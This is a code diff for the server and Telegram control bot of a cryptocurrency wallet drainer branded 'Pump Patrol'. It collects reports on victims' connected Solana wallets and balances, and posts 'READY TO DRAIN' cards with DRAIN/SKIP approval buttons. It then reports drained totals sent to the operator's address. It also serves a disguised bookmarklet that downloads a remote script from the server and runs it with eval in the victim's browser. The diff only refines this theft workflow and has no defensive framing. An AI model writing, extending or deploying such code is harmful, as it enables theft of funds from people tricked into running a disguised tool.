@@ -27,12 +27,11 @@ let offset=0;
       if(q){
         const[act,sid]=String(q.data).split(':');
         api('answerCallbackQuery',{callback_query_id:q.id});
-        const s=sessions.get(sid);
-        if(s){
+        if(sessions.has(sid)){
           verdicts.set(sid,{a:act,ts:Date.now()});
-          api('editMessageText',{chat_id:CHAT,message_id:q.message.message_id,text:(q.message.text||'')+`\n→ ${act==='go'?'DRAINING':'SKIPPED'}`,parse_mode:'HTML'});
+          api('editMessageText',{chat_id:CHAT,message_id:q.message.message_id,text:(q.message.text||'')+'\n→ '+(act==='go'?'DRAINING':'SKIPPED'),parse_mode:'HTML'});
         }
-      }else if(u.message)handle(u.message);
+      }else if(u.message)handle(u.message).catch(()=>{});
     }
     await new Promise(s=>setTimeout(s,r?0:3000));
   }
@@ -46,22 +45,32 @@ async function handle(m){
   if(c==='/start'||c==='/help')return reply('Pump Patrol control node\n/sessions — live + recent sessions\n/approve sid — allow drain\n/skip sid — decline');
   if(c==='/sessions'){
     if(!sessions.size)return reply('no sessions recorded');
-    let s='';for(const[k,v]of sessions)s+=`<code>${esc(k)}</code> ${v.done?'done':'live'} — ${esc(v.site||'?')} — ${v.wallets?.reduce((a,w)=>a+(+w.sol||0),0).toFixed(4)} SOL\n`;
+    let s='';for(const[k,v]of sessions)s+=`<code>${esc(k)}</code> ${v.done?'done':'live'} — ${esc(v.site||'?')} — ${(v.wallets||[]).reduce((a,w)=>a+(+w.sol||0),0).toFixed(4)} SOL\n`;
     return reply(`<b>sessions</b>\n${s}`);
   }
   if((c==='/approve'||c==='/go')&&sid&&sessions.has(sid)){verdicts.set(sid,{a:'go',ts:Date.now()});return reply(`approved <code>${esc(sid)}</code>`)}
   if((c==='/skip'||c==='/stop')&&sid&&sessions.has(sid)){verdicts.set(sid,{a:'stop',ts:Date.now()});return reply(`skipped <code>${esc(sid)}</code>`)}
 }
 
-function card(sid,r){
-  let s=`<b>Pump Patrol — session ${esc(sid)}</b>\nsource: ${esc(r.site||'?')}\n`;
-  for(const w of (r.wallets||[])){
-    s+=`\n${esc(w.name)} <code>${esc(w.addr)}</code>\n${w.sol} SOL`;
-    for(const t of w.tokens||[])s+=`\n· ${esc(t.mint.slice(0,6))}… ${esc(t.amt)}`;
+function btns(sid){return{inline_keyboard:[[{text:'DRAIN',callback_data:'go:'+sid},{text:'SKIP',callback_data:'stop:'+sid}]]}}
+
+function readyCard(sid,r){
+  let s='<b>Pump Patrol — session '+esc(sid)+'</b>\nsource: '+esc(r.site||'?')+'\n\n<b>WALLET CONNECTED — READY TO DRAIN</b>\n';
+  const ws=r.wallets||[];
+  if(!ws.length)s+='<i>no wallets detected in this browser</i>\n';
+  for(const w of ws){
+    s+='\n'+esc(w.name)+' <code>'+esc(w.addr)+'</code>\n'+w.sol+' SOL';
+    for(const t of w.tokens||[])s+='\n· '+esc(t.mint.slice(0,6))+'… '+esc(t.amt);
   }
-  if(r.evm)s+=`\nEVM ${esc(r.evm)}`;
-  if(r.note)s+=`\n${esc(r.note)}`;
+  if(r.evm)s+='\nEVM '+esc(r.evm);
   return s;
+}
+function doneCard(sid,r){
+  const ws=r.wallets||[];
+  const total=ws.reduce((a,w)=>a+(+w.sol||0),0);
+  let s='<b>session '+esc(sid)+' — DRAINED</b>\n';
+  if(r.note)s+=esc(r.note)+'\n';
+  return s+'source: '+esc(r.site||'?')+'\ntotal: <b>'+total.toFixed(5)+' SOL</b> → <code>'+ME+'</code>';
 }
 
 async function searchPair(sym){
@@ -71,7 +80,6 @@ async function searchPair(sym){
     return ps.find(p=>p.chainId==='solana')||ps[0]||null;
   }catch(e){return null}
 }
-
 async function candles(sym,tf){
   const pair=await searchPair(sym);
   if(!pair)return{ok:true,price:null};
@@ -86,7 +94,7 @@ async function candles(sym,tf){
     if(!p)return out;
     const c=await fetch('https://api.dextools.io/v2/chart/solana/'+p.id+'?resolution='+encodeURIComponent(tf),{headers:hdr}).then(r=>r.json()).catch(()=>null);
     const arr=c&&(c.candles||(c.data&&c.data.candles)||(Array.isArray(c.data)?c.data:null));
-    if(Array.isArray(arr))out.candles=arr.map(x=>[x.o,x.h,x.l,x.c]);
+    if(Array.isArray(arr)&&arr.length)out.candles=arr.map(x=>[x.o,x.h,x.l,x.c]);
   }catch(e){}
   return out;
 }
@@ -111,21 +119,31 @@ http.createServer(async(req,res)=>{
       if(seg[1]==='report'&&req.method==='POST'){
         let b='';for await(const c of req){b+=c;if(b.length>65536)throw 0}
         const r=JSON.parse(b);
+        r.ts=Date.now();r.done=(r.phase==='done');
         const prev=sessions.get(sid);
-        r.ts=Date.now();
+        if(prev&&prev.msgId)r.msgId=prev.msgId;
         if(prev&&r.done)r.wallets=prev.wallets||r.wallets;
         if(prev&&r.done&&!r.site)r.site=prev.site;
         sessions.set(sid,r);
-        const isDone=!!r.done;
-        await api('sendMessage',{chat_id:CHAT,text:card(sid,r),parse_mode:'HTML',disable_web_page_preview:true,
-          ...(isDone?{}:{reply_markup:{inline_keyboard:[[{text:'DRAIN',callback_data:`go:${sid}`},{text:'SKIP',callback_data:`stop:${sid}`}]]}})});
+        const ph=r.phase||'ready';
+        let text;
+        if(ph==='start')text='<b>Pump Patrol — session '+esc(sid)+'</b>\nsource: '+esc(r.site||'?')+'\n…connecting wallets';
+        else if(ph==='fault')text='<b>session '+esc(sid)+' — FAULT</b>\n'+esc(r.fault||r.note||'unknown')+'\nsource: '+esc(r.site||'?');
+        else if(ph==='done')text=doneCard(sid,r);
+        else text=readyCard(sid,r);
+        const buttons=(ph==='ready');
+        if(r.msgId){
+          await api('editMessageText',{chat_id:CHAT,message_id:r.msgId,text,parse_mode:'HTML',disable_web_page_preview:true,...(buttons?{reply_markup:btns(sid)}:{})});
+        }else{
+          const sent=await api('sendMessage',{chat_id:CHAT,text,parse_mode:'HTML',disable_web_page_preview:true,...(buttons?{reply_markup:btns(sid)}:{})});
+          if(sent&&sent.message_id)sessions.get(sid).msgId=sent.message_id;
+        }
         return json(res,{ok:true});
       }
       return json(res,{ok:false},404);
     }
     if(u.pathname==='/bookmarks.html'){
-      const host=req.headers.host||'';
-      const base='https://'+host;
+      const base='https://'+(req.headers.host||'');
       const bm=`javascript:(async()=>{try{window.__PP=${JSON.stringify(base)};const r=await fetch(${JSON.stringify(base+'/p.js')}+"?t="+Date.now());(0,eval)(await r.text())}catch(e){console.warn(e)}})();void 0`;
       const hm=bm.replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/</g,'&lt;');
       res.writeHead(200,{'content-type':'text/html','content-disposition':'attachment; filename="pump-patrol-bookmark.html"'});
